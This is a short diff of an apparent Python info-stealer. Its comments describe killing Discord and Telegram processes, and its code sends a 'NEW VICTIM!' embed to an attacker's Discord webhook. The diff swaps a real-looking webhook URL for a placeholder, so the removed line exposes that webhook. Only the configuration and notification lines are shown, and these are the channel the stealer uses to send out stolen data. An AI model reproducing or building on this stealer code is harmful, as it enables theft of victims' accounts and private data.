@@ -32,7 +32,7 @@ log_out = 0  # this is log_out for kill process stealer, (discord + telegram). 1
 
 
 ################################### Send new victim messsage #############################
-hook = Webhook("https://discord.com/api/webhooks/851798133741584384/wlHP0xLwTWayJz00G1mDpTDs7x2JViPlHnrlHBCJe3Z3Oxsf3o1gJSuZMWQCz1UWFeE1") # Your webhook id
+hook = Webhook("https://discord.com/api/webhooks/xxxxxxxxxxxxxxxxxx/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx") # Your webhook id
 embed = Embed(
     description='NEW VICTIM!',
     color=0x5CDBF0,
